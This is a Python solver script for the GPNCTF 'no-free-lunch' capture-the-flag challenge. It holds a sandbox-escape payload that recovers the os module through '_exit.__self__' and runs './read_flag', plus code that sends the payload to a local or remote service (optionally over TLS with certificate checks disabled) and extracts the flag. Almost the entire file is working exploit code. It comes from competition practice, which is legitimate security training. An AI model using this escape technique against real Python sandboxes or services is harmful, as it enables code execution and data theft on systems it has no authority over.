#!/usr/bin/env python3
import argparse
import os
import re
import socket
import ssl as sslmod
import subprocess
import sys
from pathlib import Path

PAYLOAD = """p=_exit.__self__
_exit=lambda x:None
p.system('./read_flag')
"""


def extract_flag(s: str) -> str | None:
    m = re.search(r"GPNCTF\{[^}\n]+\}", s)
    return m.group(0) if m else None


def run_local(chal_dir: Path, prepare: bool = False) -> str:
    src = chal_dir / "src"
    if not src.exists():
        src = chal_dir
    if prepare:
        rf = src / "read_flag"
        if not rf.exists():
            subprocess.run(["cc", "-O2", "-o", str(rf), str(src / "read_flag.c")], check=True)
            try:
                os.chmod(rf, 0o4755)
            except PermissionError:
                os.chmod(rf, 0o755)
        if os.geteuid() == 0 and not Path("/flag").exists():
            Path("/flag").write_text("GPNCTF{local_fake_flag_for_validation}\n")
            os.chmod("/flag", 0o700)
    env = os.environ.copy()
    env["PYTHONPATH"] = "./lib"
    p = subprocess.run(
        [sys.executable, "server.py"],
        input=PAYLOAD + "EOF\n",
        cwd=src,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=15,
    )
    return p.stdout


def recv_all(sock: socket.socket, timeout: float = 2.0) -> bytes:
    sock.settimeout(timeout)
    chunks: list[bytes] = []
    while True:
        try:
            b = sock.recv(4096)
            if not b:
                break
            chunks.append(b)
        except TimeoutError:
            break
        except socket.timeout:
            break
    return b"".join(chunks)


def run_remote(host: str, port: int, use_ssl: bool = False) -> str:
    raw = socket.create_connection((host, port), timeout=10)
    if use_ssl:
        ctx = sslmod.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = sslmod.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=host)
    else:
        s = raw
    with s:
        banner = recv_all(s, 1.0)
        s.sendall((PAYLOAD + "EOF\n").encode())
        out = banner + recv_all(s, 5.0)
    return out.decode("utf-8", "replace")


def main() -> None:
    ap = argparse.ArgumentParser(description="Solver for no-free-lunch")
    ap.add_argument("host", nargs="?", help="remote host")
    ap.add_argument("port", nargs="?", type=int, help="remote port")
    ap.add_argument("--ssl", action="store_true", help="use TLS/SSL for remote service")
    ap.add_argument("--local", default=".", help="challenge directory for local run")
    ap.add_argument("--prepare-local", action="store_true", help="compile local read_flag and create /flag when running as root")
    args = ap.parse_args()

    if args.host and args.port:
        out = run_remote(args.host, args.port, args.ssl)
    else:
        out = run_local(Path(args.local).resolve(), args.prepare_local)

    print(out, end="" if out.endswith("\n") else "\n")
    flag = extract_flag(out)
    if flag:
        print(f"[+] extracted flag: {flag}")
    else:
        print("[-] no GPNCTF{...} flag found in output")


if __name__ == "__main__":
    main()
